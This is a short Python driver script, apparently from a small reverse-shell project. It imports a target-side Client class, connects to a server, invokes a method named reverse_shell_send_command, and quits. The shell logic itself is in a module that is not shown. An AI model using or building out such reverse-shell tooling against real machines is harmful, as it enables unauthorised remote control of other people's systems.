from ObjetClientTarget import Client

client = Client()
client.connect_to_server()
client.reverse_shell_send_command()
client.quit()
